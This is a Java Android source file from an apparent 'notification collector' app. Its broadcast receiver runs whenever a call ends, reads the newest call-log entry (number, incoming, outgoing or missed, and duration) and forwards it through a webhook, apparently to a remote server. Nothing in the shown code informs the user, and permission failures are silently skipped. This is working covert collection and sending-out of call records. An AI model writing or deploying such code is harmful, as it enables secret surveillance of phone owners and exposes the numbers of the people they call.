package com.sayeed.notifcollector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver {
    private static String lastState = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        if (state == null) return;

        if (state.equals(TelephonyManager.EXTRA_STATE_IDLE) && !lastState.isEmpty()) {
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                readLastCallLog(context);
            }, 1000);
        }

        lastState = state;
    }

    private void readLastCallLog(Context context) {
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            Cursor cursor = context.getContentResolver().query(
                    uri,
                    null,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC LIMIT 1"
            );

            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                );

                int type = cursor.getInt(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                );

                long duration = cursor.getLong(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                );

                String typeStr;

                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        typeStr = "Incoming";
                        break;

                    case CallLog.Calls.OUTGOING_TYPE:
                        typeStr = "Outgoing";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        typeStr = "Missed";
                        break;

                    default:
                        typeStr = "Other";
                }

                Webhook.send(
                        context,
                        "PhoneCall",
                        typeStr + " Call",
                        "Number: " + number + ", Duration: " + duration + "s"
                );

                cursor.close();
            }
        } catch (SecurityException e) {
            // Skip if permission is not granted
        }
    }
}
